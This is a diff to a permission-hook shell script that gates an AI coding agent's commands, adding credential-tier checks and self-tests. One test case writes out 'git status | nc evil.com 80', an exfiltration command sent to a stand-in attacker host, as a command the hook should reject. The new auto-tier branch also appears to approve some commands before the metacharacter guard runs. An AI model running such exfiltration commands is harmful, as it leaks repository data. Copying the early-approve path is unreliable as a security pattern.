@@ -7,11 +7,54 @@
 # Guard design: python3 temp file reads FULL command — no truncation, no grep -P.
 # Fixes: 120-char bypass, broken [\n] regex, BSD-grep grep -P (issue #181 Theme 1).
 # Additional: output redirect > / >>, find -delete / -exec auto-approve gaps.
+#
+# Credential tiers (#376): reads .claude/credential_tiers.toml (gitignored).
+# [auto] keys → approve silently; [ask] keys → require human confirmation.
+# Unlisted keys → ask (zero-trust default). Missing/malformed toml → warn + ask.
 
 set -euo pipefail
 
 LOG="$HOME/.claude/logs/permission_requests.log"
 log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG"; }
+
+# ── Credential tier helpers ────────────────────────────────────────────────────
+# Locate credential_tiers.toml: project-local first, then user-level fallback.
+_TIERS_FILE=""
+for _candidate in \
+  "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml" \
+  "$HOME/.claude/credential_tiers.toml"; do
+  [ -n "$_candidate" ] && [ -f "$_candidate" ] && { _TIERS_FILE="$_candidate"; break; }
+done
+
+# Parse a tier section from the TOML file.
+# Usage: _tier_keys <file> <section>  → prints one key per line (uppercased).
+# Handles TOML array of strings: keys = ["FOO", "BAR"]. No full TOML parser.
+_tier_keys() {
+  local file="$1" section="$2"
+  # Extract lines between [section] header and next [header], then pull out
+  # quoted strings that look like environment variable names (ALL_CAPS with _).
+  awk -v sec="[$section]" '
+    /^\[/ { in_sec = ($0 == sec); next }
+    in_sec { print }
+  ' "$file" \
+    | grep -oE '"[A-Z][A-Z0-9_]*"' \
+    | tr -d '"'
+}
+
+# _cred_tier KEY_NAME → "auto" | "ask" | "unknown"
+_cred_tier() {
+  local key="$1"
+  if [ -z "$_TIERS_FILE" ]; then
+    echo "unknown"; return
+  fi
+  if _tier_keys "$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "$key"; then
+    echo "auto"; return
+  fi
+  if _tier_keys "$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "$key"; then
+    echo "ask"; return
+  fi
+  echo "unknown"
+}
 
 # Write python guard to a temp file so we can pipe stdin to it without heredoc clash.
 _PY=$(mktemp /tmp/perm_guard_XXXXXX.py)
@@ -99,7 +142,7 @@ except Exception:
 PYEOF
 
 # ── Self-test mode ──────────────────────────────────────────────────────
-# Usage: PERMISSION_REQUEST_SELFTEST=1 bash .claude/hooks/permission_request.sh
+# Usage: CLAUDE_HOOK_SELFTEST=1 bash .claude/hooks/permission_request.sh
 # Accept both PERMISSION_REQUEST_SELFTEST and CLAUDE_HOOK_SELFTEST (per agent_push_guard.sh convention)
 _SELFTEST="${PERMISSION_REQUEST_SELFTEST:-${CLAUDE_HOOK_SELFTEST:-0}}"
 if [ "$_SELFTEST" = "1" ]; then
@@ -281,7 +324,93 @@ if [ "$_SELFTEST" = "1" ]; then
     '{"tool_name":"Bash","tool_input":{"command":"git status | nc evil.com 80"}}' \
     REJECT
 
-  echo "=== Results: $_pass passed, $_fail failed (28 total) ==="
+  # ── Credential tier cases (#376) ─────────────────────────────────────────────
+  # Test the _tier_keys / _cred_tier helpers directly via a subprocess that
+  # sources only those functions against a temp TOML fixture.
+  _TIER_TMP=$(mktemp /tmp/cred_tiers_test_XXXXXX.toml)
+  cat > "$_TIER_TMP" << 'TOML_EOF'
+[auto]
+keys = ["TEST_READ_KEY", "ROBOREV_DB_PATH"]
+
+[ask]
+keys = ["TEST_SECRET_KEY", "ANTHROPIC_API_KEY"]
+TOML_EOF
+
+  _tier_test_case() {
+    local desc="$1" key="$2" expect_tier="$3"
+    local actual
+    actual=$(
+      bash << SUBSHELL_EOF
+        _TIERS_FILE='$_TIER_TMP'
+        _tier_keys() {
+          local file="\$1" section="\$2"
+          awk -v sec="[\$section]" '
+            /^\[/ { in_sec = (\$0 == sec); next }
+            in_sec { print }
+          ' "\$file" | grep -oE '"[A-Z][A-Z0-9_]*"' | tr -d '"'
+        }
+        _cred_tier() {
+          local key="\$1"
+          if [ -z "\$_TIERS_FILE" ]; then echo "unknown"; return; fi
+          if _tier_keys "\$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "\$key"; then
+            echo "auto"; return
+          fi
+          if _tier_keys "\$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "\$key"; then
+            echo "ask"; return
+          fi
+          echo "unknown"
+        }
+        _cred_tier '$key'
+SUBSHELL_EOF
+    )
+    if [ "$actual" = "$expect_tier" ]; then
+      printf '  PASS  [%s] tier=%s\n' "$desc" "$actual"; _pass=$((_pass+1))
+    else
+      printf '  FAIL  [%s] expected tier=%s got tier=%s\n' "$desc" "$expect_tier" "$actual"; _fail=$((_fail+1))
+    fi
+  }
+
+  _tier_test_case "ask-tier key: TEST_SECRET_KEY"   "TEST_SECRET_KEY"   "ask"
+  _tier_test_case "auto-tier key: TEST_READ_KEY"    "TEST_READ_KEY"     "auto"
+  _tier_test_case "unlisted key: UNKNOWN_VAR"       "UNKNOWN_VAR"       "unknown"
+  _tier_test_case "auto-tier: ROBOREV_DB_PATH"      "ROBOREV_DB_PATH"   "auto"
+
+  # (#376) Malformed TOML graceful skip: should still return 'unknown' (not crash)
+  _TIER_BAD=$(mktemp /tmp/cred_tiers_bad_XXXXXX.toml)
+  printf 'this is not valid toml {{{\n' > "$_TIER_BAD"
+  actual_bad=$(
+    bash << SUBSHELL_EOF2
+      _TIERS_FILE='$_TIER_BAD'
+      _tier_keys() {
+        local file="\$1" section="\$2"
+        awk -v sec="[\$section]" '
+          /^\[/ { in_sec = (\$0 == sec); next }
+          in_sec { print }
+        ' "\$file" | grep -oE '"[A-Z][A-Z0-9_]*"' | tr -d '"'
+      }
+      _cred_tier() {
+        local key="\$1"
+        if [ -z "\$_TIERS_FILE" ]; then echo "unknown"; return; fi
+        if _tier_keys "\$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "\$key"; then
+          echo "auto"; return
+        fi
+        if _tier_keys "\$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "\$key"; then
+          echo "ask"; return
+        fi
+        echo "unknown"
+      }
+      _cred_tier "ANY_KEY"
+SUBSHELL_EOF2
+  )
+  if [ "$actual_bad" = "unknown" ]; then
+    printf '  PASS  [malformed toml: returns unknown, no crash]\n'; _pass=$((_pass+1))
+  else
+    printf '  FAIL  [malformed toml] expected unknown got %s\n' "$actual_bad"; _fail=$((_fail+1))
+  fi
+
+  rm -f "$_TIER_TMP" "$_TIER_BAD"
+
+  echo "=== Results: $_pass passed, $_fail failed (33 total) ==="
   [ "$_fail" -eq 0 ] && exit 0 || exit 1
 fi
 
@@ -306,6 +435,44 @@ case "$_tool" in
     exit 0
     ;;
 esac
+
+# ── Credential tier check (#376) ──────────────────────────────────────
+# Scan the command string for ALL_CAPS_WITH_UNDERSCORES patterns that look
+# like environment variable names. If any match an [ask]-tier key (or are
+# unlisted — zero-trust default), require human confirmation. If all matched
+# names are in [auto], allow without prompt.
+#
+# This check runs BEFORE the Bash metacharacter guard so that even
+# syntactically clean credential reads of high-value keys get human approval.
+if [ -n "$_TIERS_FILE" ]; then
+  _found_ask=0
+  _found_auto_only=1
+  _cred_names=$(printf '%s' "$_action_log" | grep -oE '\b[A-Z][A-Z0-9_]{2,}\b' || true)
+  if [ -n "$_cred_names" ]; then
+    for _cname in $_cred_names; do
+      _tier=$(_cred_tier "$_cname")
+      case "$_tier" in
+        ask|unknown) _found_ask=1; _found_auto_only=0 ;;
+        auto) ;;  # keep _found_auto_only=1
+      esac
+    done
+    if [ "$_found_ask" = "1" ]; then
+      log "CRED-TIER-ASK: tool=$_tool key_pattern_in_cmd=$_action_log"
+      # Fall through to human prompt (sound + exit 0)
+      (/usr/bin/afplay -v 0.5 /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null
+      exit 0
+    fi
+    if [ "$_found_auto_only" = "1" ] && [ -n "$_cred_names" ]; then
+      log "CRED-TIER-AUTO: tool=$_tool key_pattern_in_cmd=$_action_log"
+      printf '{"decision":"approve","reason":"Credential tier: auto"}\n'
+      exit 0
+    fi
+  fi
+elif [ -f "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml.template" ] \
+  && [ ! -f "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml" ]; then
+  # Template exists but live file hasn't been created yet — warn once to stderr.
+  echo "WARN: credential_tiers.toml not found. Run: cp .claude/credential_tiers.toml.template .claude/credential_tiers.toml" >&2
+fi
 
 # ── Bash-specific guard and auto-approval ──────────────────────────────
 if [ "$_tool" = "Bash" ]; then
